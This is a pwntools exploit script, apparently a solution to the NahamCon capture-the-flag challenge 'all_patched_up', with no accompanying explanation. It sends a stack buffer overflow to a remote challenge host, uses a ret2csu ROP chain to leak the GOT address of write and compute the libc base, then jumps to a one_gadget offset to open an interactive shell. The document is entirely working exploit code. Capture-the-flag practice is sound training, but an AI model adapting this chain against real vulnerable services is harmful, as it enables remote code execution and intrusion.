from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('./all_patched_up')
libc = elf.libc
p = elf.process()
p = remote('challenge.nahamcon.com',32244)
#gdb.attach(p)

csu_mov = 0x0000000000401230
ret = 0x00000000004011ed
pop_csu =0x000000000040124a

payload = cyclic(512) + p64(ret)
payload += p64(pop_csu) + p64(0) + p64(1) 
payload += p64(1) + p64(elf.got.write) + p64(8) + p64(elf.got.write)
payload += p64(csu_mov)
payload += p64(0)*7 + p64(elf.sym.main)
p.sendafter(b'> ', payload)

libc.address = unpack(p.recvn(6),'all') - libc.sym.write
print(hex(libc.address))

payload = cyclic(512) + p64(ret)
payload += p64(libc.address + 0xe3afe)

p.send(payload)
p.interactive()
